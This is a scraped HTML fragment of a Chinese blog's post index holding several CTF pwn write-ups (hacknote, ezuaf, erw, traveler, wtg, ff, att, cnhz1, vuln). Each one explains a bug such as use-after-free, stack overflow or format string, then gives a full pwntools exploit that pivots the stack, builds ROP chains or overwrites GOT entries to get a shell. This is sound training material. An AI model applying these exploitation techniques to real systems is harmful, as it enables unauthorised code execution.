&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708238447495.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;add_note&#34;&gt;add_note&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708238515279.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
注意&lt;code&gt;**(&amp;amp;notelist + i) = print_note_content&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;print_note&#34;&gt;print_note&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708238621092.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
注意&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; if ( result )
    return (**(&amp;amp;notelist + v2))(*(&amp;amp;notelist + v2));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如果有内容则会调用chunk中的print_note_content函数输出内容，所以想到将print_note_content的位置改为magic函数（后门函数）&lt;/p&gt;
&lt;h1 id=&#34;delete&#34;&gt;delete&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708240322241.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
free后未置NULL，存在uaf漏洞&lt;/p&gt;
&lt;h2 id=&#34;free顺序&#34;&gt;free顺序&lt;/h2&gt;
&lt;p&gt;先content后notelist&lt;br&gt;
创建两个note后的堆&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;|chunk(notelist0)|&amp;lt;--malloc(8)
|chunk(note0)    |&amp;lt;--malloc(20)
|chunk(notelist1)|&amp;lt;--malloc(8)
|chunk(note1)    |&amp;lt;--malloc(20)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;删除note1和0后再创建一个8size的chunk后的堆（tcachebins是先进后出，后删的note0先申请的notelist2，所以notelist2在上面，note2在下面）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;|chunk(notelist2)|&amp;lt;--malloc(8)
|chunk(note0)    |&amp;lt;--malloc(20)
|chunk(note2)    |&amp;lt;--malloc(8)          
|chunk(note1)    |&amp;lt;--malloc(20)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;所以编辑note2的内容为后门函数，之后调用print函数即可拿到shell&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./hacknote&amp;quot;)
elf = ELF(&amp;quot;./hacknote&amp;quot;)

def add(size,string):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(string)
    
def delete(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
    
def printf(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
	
add(20,&amp;quot;aaaa&amp;quot;)
add(20,&amp;quot;bbbb&amp;quot;)
delete(1)
delete(0)
payload = p32(0x08048945)
add(8,payload)
printf(1)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708242660643.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">hacknote（32位UAF）</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ezuaf/"" data-c="
          &lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708231702664.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看题目逻辑&lt;/p&gt;
&lt;h1 id=&#34;creat&#34;&gt;creat&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708231714973.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
i起始为0，创建的起始页内容是&amp;quot;giao&amp;quot;和echo（puts）函数的地址&lt;/p&gt;
&lt;h1 id=&#34;del&#34;&gt;del&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708231870458.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现可以删除起始页&lt;/p&gt;
&lt;h1 id=&#34;show&#34;&gt;show&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708231945667.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现如果要查看起始页则会&lt;strong&gt;调用起始页地址中的echo函数&lt;/strong&gt;输出&amp;quot;giao&amp;quot;（实际上还有echo函数的地址）&lt;/p&gt;
&lt;h1 id=&#34;edit&#34;&gt;edit&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708232105575.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现无法向起始页写入内容（而且并没有检查输入的文本长度，可能出现溢出）&lt;/p&gt;
&lt;h1 id=&#34;题目给出了system函数&#34;&gt;题目给出了system函数&lt;/h1&gt;
&lt;h1 id=&#34;攻击思路&#34;&gt;攻击思路：&lt;/h1&gt;
&lt;p&gt;由于show会调用起始页中的函数，所以将echo函数改为system函数，然后将&amp;quot;giao&amp;quot;改为sh即可拿到shell。&lt;br&gt;
1.creat起始页&lt;br&gt;
2.del起始页（chunk放入了tcachebins）&lt;br&gt;
3.creat第一页（malloc申请的内存大小都是一样的，所以第一页放在了原来是起始页的内存上）&lt;br&gt;
4.在第一页（起始页内存）上写下system函数地址，和sh字符串&lt;br&gt;
5.show起始页，便会调用起始页地址中的system函数取得shell.&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./ezuaf&amp;quot;)
elf = ELF(&amp;quot;./ezuaf&amp;quot;)

# creat 0---
def create():
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)

def edit(idx,string):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(string)
    
def delete(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(str(idx))
    
def show(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(str(idx))
	
create()
delete(0)
create()
payload = b&#39;sh\x00\x00&#39; + p32(0x08048642)
edit(1, payload)
show(0)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708234527720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">ezuaf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/2024212/"" data-c="
          &lt;h1 id=&#34;erw栈迁移&#34;&gt;erw（栈迁移）&lt;/h1&gt;
&lt;p&gt;查看保护&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707883188078.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
再看题目逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707883121624.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只有一个栈溢出，发现打开了目标文件，所以想到打orw，open已经执行，设法执行rw，这里w换为puts函数，传参时发现溢出长度不够，只有40个字节，所以考虑栈迁移，由于栈迁移需要调用read函数在bss段写入，由于gadgets只有pop rsi;pop r15;ret，所以向read函数传入bss地址需要24个字节，只剩下16个字节，又要调栈又要调用read函数，所以想到利用程序本身，read函数和leave；ret紧挨，所以exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./erw&amp;quot;)
elf = ELF(&amp;quot;./erw&amp;quot;)

rdi = 0x4013c3
rsi_r15 = 0x4013c1
bss = 0x4040C0
read = 0x4010C0
puts = 0x4010A0
leave = 0x401344

#gdb.attach(p)

payload = b&#39;a&#39;*0x40 + p64(bss + 0x60) + p64(rsi_r15) + p64(bss + 0x60) + p64(0) + p64(leave)
p.sendafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;,payload)

payload = p64(0xdeadbeef) + p64(rdi) + p64(3) + p64(rsi_r15) + p64(bss + 0x200) + p64(0) + p64(read)
payload += p64(rdi) + p64(bss + 0x200) + p64(puts)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;成功打印出创建的flag&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707883813024.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;traveler栈迁移&#34;&gt;traveler（栈迁移）&lt;/h1&gt;
&lt;p&gt;查看保护，发现和上一道题保护一样&lt;br&gt;
查看题目逻辑&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707886063130.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
只溢出了16个字节，所以打栈迁移&lt;br&gt;
发现后门函数&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707886082474.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
注意：&lt;br&gt;
&lt;strong&gt;echo指令不可以直接打印文件。echo指令用于在终端上打印文本或变量的值，而不是打印文件内容。要打印文件内容，可以使用cat指令或者其他适当的命令。&lt;/strong&gt; 🤡&lt;br&gt;
发现第一个read函数写入的位置是根据rbp的位置来计算的，所以就可以通过改变栈的位置来改变第一个read函数写的位置，也算是实现了任意位置写了吧😅&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707892482660.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
再一点就是栈迁移的位置，0x404000-0x405000都是可写的，经调试发现0x404d00就可以作为栈迁移的位置，前面的应该是有动态链接的函数或者其他重要的东西，所以不能更改，否则会EOF&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&amp;quot;amd64&amp;quot;,os=&amp;quot;linux&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./traveler&#39;)
elf = ELF(&#39;./traveler&#39;)


leave = 0x401253
msg = 0x4040A0
bss = 0x404d00
rdi = 0x4012c3
sys = 0x401090
read = 0x4010A0
re_read = 0x401216

#gdb.attach(p)

payload = b&#39;a&#39;*0x20 + p64(bss + 0x20) + p64(re_read)  #rbp = bss + 0x20
p.sendafter(&amp;quot;u?\n&amp;quot;,payload)

payload = b&#39;a&#39;*0x28
p.sendafter(&amp;quot;life?\n&amp;quot;,payload)

payload = p64(rdi) + p64(msg) + p64(sys) + p64(0) + p64(bss - 8) + p64(leave)  #rbp = bss - 8 ; leave -&amp;gt; rsp + 8
p.send(payload)

p.sendafter(&amp;quot;life?\n&amp;quot;,b&#39;/bin/sh\x00&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707892972670.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;wtgret2lib&#34;&gt;wtg(ret2lib)&lt;/h1&gt;
&lt;p&gt;还是普通的ret2libc......🙏&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./wtg&#39;)
elf = ELF(&#39;./wtg&#39;)
libc = ELF(&#39;./libc-2.31.so&#39;)

puts_plt = 0x401060
puts_got = 0x404018
main_addr = 0x4011BD
pop_rdi_ret = 0x4012d3
ret = 0x40101a

#gdb.attach(p)

payload = b&#39;a&#39;*128 + p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&amp;quot;go?\n&amp;quot;,payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))


print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)

payload = b&#39;b&#39;*128 + p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707893787554.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">2024.2.12</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/202429/"" data-c="
          &lt;h1 id=&#34;ff一次格式化字符串一次栈溢出&#34;&gt;ff(一次格式化字符串，一次栈溢出)&lt;/h1&gt;
&lt;p&gt;查下保护，保护全开&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707568409559.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看程序，一次格式化字符串，一次栈溢出，有cannary和PIE&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707568479742.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看偏移，第17个参数可以泄露cannary，第19个参数可以泄露程序实际地址，程序中有后门函数&lt;br&gt;
exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./ff&amp;quot;)
elf = ELF(&amp;quot;./ff&amp;quot;)

sem = b&amp;quot;name? &amp;quot;
p.sendlineafter(sem,b&amp;quot;%17$p-%19$p&amp;quot;)

p.recvuntil(&amp;quot;0x&amp;quot;)
can = int(p.recv(16),16)
print(&amp;quot;can = &amp;quot;,hex(can))

re = int(p.recv(15)[3:],16)
print(&amp;quot;re = &amp;quot;,hex(re))

text_base = re - 0x146F
print(&amp;quot;base = &amp;quot;,hex(text_base))

sys = text_base + 0x1231

payload = b&#39;a&#39;*56 + p64(can) + p64(0xdeadbeef) + p64(sys)
p.sendlineafter(&amp;quot;else? &amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707568652743.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;att格式化字符串&#34;&gt;att(格式化字符串)&lt;/h1&gt;
&lt;p&gt;查下保护，同样全开&lt;br&gt;
看下偏移&lt;br&gt;
第20个参数可以泄露程序真实地址，从而找到printf的got表实际，地址第21个参数为__libc_start_call_main+122，可以借此泄露libc基地址，再将printf函数got表地址改为system&lt;br&gt;
exp如下（可能一次打不过去，因为是用fmtstr自动生成的可利用格式化字符串，每次运行地址不同，生成的payload长度也不同，read长度限制在0x64，多试几次就能打通）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./att&amp;quot;)
elf = ELF(&amp;quot;./att&amp;quot;)

#gdb.attach(p)

sem = b&amp;quot;say: &amp;quot;
p.sendafter(sem,b&amp;quot;%19$p-%20$p-%21$p&amp;quot;)

p.recvuntil(&amp;quot;0x&amp;quot;)
can = int(p.recv(16),16)
print(&amp;quot;can = &amp;quot;,hex(can))

re = int(p.recv(15)[3:],16)
print(&amp;quot;re = &amp;quot;,hex(re))

text_base = re - 0xaa0
print(&amp;quot;text_base = &amp;quot;,hex(text_base))

__libc_start_main = int(p.recv(15)[3:],16) - 240
print(&amp;quot;__libc_start_main = &amp;quot;,hex(__libc_start_main))
libc_base = __libc_start_main - 0x20740

sys = libc_base + 0x45380

printf_got = text_base + 0x201030
print(&amp;quot;sys = &amp;quot;,hex(sys))

pay = fmtstr_payload(6,{printf_got : sys})
p.sendlineafter(sem,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707572802862.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;pwn&#34;&gt;pwn&lt;/h1&gt;
&lt;p&gt;查下保护，没开PIE，其他全开&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707578740105.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
查看程序逻辑，首先是一个格式化字符串然后判断v5和v4相等之后有一个栈溢出&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707579064182.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
发现0x7fffffffddf8存放着指向0x22b的0x7fffffffdde8，可以通过&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;%*8$c%9$hn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;实现绕过（格式化字符串中&#39;*&#39;的作用，直接改值也行）&lt;br&gt;
在动态调试下发现vuln函数中的cannary和main函数一样，canary是第15个参数，可以顺便泄露掉，到了vuln函数后就是普通的ret2libc了，顺便学到了recv的一种读取方法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;canary = int(p.recvuntil(b&#39;.&#39;, drop = True)  ,16)#设置了drop参数为True，表示读取到&#39;.&#39;后会将&#39;.&#39;从输入流中丢弃
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./pwn&amp;quot;)
elf = ELF(&amp;quot;./pwn&amp;quot;)
libc = ELF(&amp;quot;./libc-2.31.so&amp;quot;)

#gdb.attach(p)

pay = b&#39;%*8$c%9$hn-%15$p&#39;
p.sendafter(b&amp;quot;Toka\n\n&amp;quot;, pay)
 
p.recvuntil(b&#39;0x&#39;)
#canary = int(p.recvuntil(b&#39;.&#39;, drop = True)  ,16)#设置了drop参数为True，表示读取到&#39;.&#39;后会将&#39;.&#39;从输入流中丢弃
canary = int(p.recv(16)  ,16)
print(&amp;quot;canary = &amp;quot;,canary)
 
pop_rdi = 0x4013f3
vuln = 0x40125d
 
pay = b&#39;A&#39;*40 + p64(canary) + p64(0x404800) + p64(pop_rdi) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(vuln)
p.sendlineafter(b&amp;quot;level\n\n&amp;quot;, pay)
 
libc_base = u64(p.recv(6).ljust(8, b&#39;\x00&#39;)) - libc.sym[&#39;puts&#39;]


sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
sys = libc_base + libc.sym[&#39;system&#39;]
ret = 0x40101a
 
pay = b&#39;A&#39;*40 + p64(canary) + p64(0x404800) + p64(ret) + p64(pop_rdi) + p64(sh) + p64(sys) + p64(vuln)
p.sendlineafter(b&amp;quot;I know you like him, but you must pass my level\n\n&amp;quot;, pay)
 
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707579511079.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">2024.2.9</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/202428/"" data-c="
          &lt;h1 id=&#34;cnhz1&#34;&gt;cnhz1&lt;/h1&gt;
&lt;p&gt;普通的ret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./cnhz1&#39;)
elf = ELF(&#39;./cnhz1&#39;)

p.sendlineafter(&amp;quot;choice!\n&amp;quot;,b&#39;1&#39;)

puts_plt = 0x4006E0
gets_got = 0x602050
main_addr = 0x4009A0
pop_rdi_ret = 0x400c83
ret = 0x4006b9

#gdb.attach(p)

payload = b&#39;a&#39;*88+p64(pop_rdi_ret)+p64(gets_got)+p64(puts_plt)+p64(main_addr)
p.sendlineafter(&amp;quot;encrypted\n&amp;quot;,payload)

gets_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(gets_addr))

libc = LibcSearcher(&amp;quot;gets&amp;quot;,gets_addr)
libc_base = gets_addr - libc.dump(&amp;quot;gets&amp;quot;)
system_addr = libc_base + libc.dump(&amp;quot;system&amp;quot;)
bin_addr = libc_base + libc.dump(&amp;quot;str_bin_sh&amp;quot;)
# 6 - libc6_2.37-9_amd64

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
payload=b&#39;b&#39;*88+p64(ret)+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707407190027.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;vuln栈迁移&#34;&gt;vuln（栈迁移）&lt;/h1&gt;
&lt;p&gt;先将下载的libc文件链接到程序&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter &#39;/home/gg/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so&#39;  --set-rpath &#39;/home/gg/glibc-all-in-one/libs/2.23-0ubuntu3_amd64&#39;  &#39;/home/gg/Desktop/1/vuln&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;bss + 0x30 是为了防止栈生长过高，利用Onegadget查看可用地址,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./vuln&#39;)
elf = ELF(&#39;./vuln&#39;)
libc = ELF(&#39;./libc-2.23.so&#39;)

bss = 0x601080
leave_ret = 0x400699
vuln = 0x400656
pop_rdi_ret = 0x400703
read_got = 0x601028
puts_plt = 0x4004e0

payload = b&#39;a&#39; * 96 + p64(bss + 0x30) + p64(leave_ret)
p.sendafter(&amp;quot;want\n&amp;quot;,payload)

gdb.attach(p)

payload = cyclic(0x30) + p64(bss + 0x40) + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vuln)
p.sendafter(&amp;quot;now!\n&amp;quot;,payload)
#rsp = bss + 0x30  ,  rbp = bss + 0x40

read_addr = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(read_addr))

libc_base = read_addr - libc.symbols[&#39;read&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;read = &amp;quot;,hex(libc.symbols[&#39;read&#39;]))

payload = b&#39;a&#39; * 0x60 + p64(0xdeadbeef) + p64(0x4525a + libc_base)
p.sendafter(&amp;quot;want\n&amp;quot;,payload)

#第二个read在bss起始读取0x100个数据，rbp = bss + 0x40
payload = b&#39;a&#39; * 0x40 + p64(0xdeadbeef) + p64(0x4525a + libc_base)#onegadgetds
p.sendafter(&amp;quot;now!\n&amp;quot;,payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707407196804.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;vuln数组溢出&#34;&gt;vuln（数组溢出）&lt;/h1&gt;
&lt;p&gt;首先改下libc文件&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;patchelf --set-interpreter &#39;/home/gg/Desktop/day1/0/ld-2.31.so&#39;  --set-rpath &#39;/home/gg/glibc-all-in-one/libs/2.31-0ubuntu9_amd64&#39; &#39;/home/gg/Desktop/day1/0/vuln&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1707407203345.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;发现可以通过输入负数实现任意地址更改，选择更改got表，由于只有一次不能完成泄露libc地址和执行system函数，所以先将exit函数改为vuln地址，由于函数实际地址低三位不变所以可以通过第二次泄露libc基地址，从而得到system实际地址，由于puts(&amp;amp;seats[16 * v0])，所以将puts函数got表存的实际地址改为system，将seat[16*v0]改为/bin/sh便可成功拿到shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./vuln&amp;quot;)
elf = ELF(&amp;quot;./vuln&amp;quot;)
libc = ELF(&amp;quot;./libc-2.31.so&amp;quot;)

vuln = elf.sym[&amp;quot;vuln&amp;quot;]

p.sendlineafter(b&amp;quot;one.\n&amp;quot;, b&amp;quot;-6&amp;quot;)
p.sendafter(b&amp;quot;name\n&amp;quot;, p64(vuln))

p.sendlineafter(b&amp;quot;one.&amp;quot;, b&amp;quot;-8&amp;quot;)
p.sendafter(b&amp;quot;name&amp;quot;, b&amp;quot;\x50&amp;quot;)
p.recvuntil(b&amp;quot;is &amp;quot;)
setbuf = u64(p.recv(6).ljust(8, b&amp;quot;\x00&amp;quot;))
print(&amp;quot;setbuf = &amp;quot;,hex(setbuf))
print(&amp;quot;setbuf = &amp;quot;,hex(libc.sym[b&amp;quot;setbuf&amp;quot;]))

libc_base = setbuf - libc.symbols[b&amp;quot;setbuf&amp;quot;]
system_addr = libc_base + 0x55410

p.sendlineafter(b&amp;quot;one.&amp;quot;, b&amp;quot;-9&amp;quot;)
p.sendafter(b&amp;quot;name&amp;quot;, b&amp;quot;/bin/sh\x00&amp;quot; + p64(system_addr))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行结果如下&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707558751549.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">2024.2.8</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/huan-libc-yuan-yi-xie-shellcode-mo-ban-orw/"" data-c="
          &lt;h1 id=&#34;glibc-all-in-one&#34;&gt;glibc-all-in-one&lt;/h1&gt;
&lt;p&gt;在glibc-all-in-one目录下&lt;/p&gt;
&lt;h2 id=&#34;获取可下载的libc列表&#34;&gt;获取可下载的libc列表&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;cat list 
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;./download name
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;查看目前链接信息&#34;&gt;查看目前链接信息&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;ldd -v 文件名
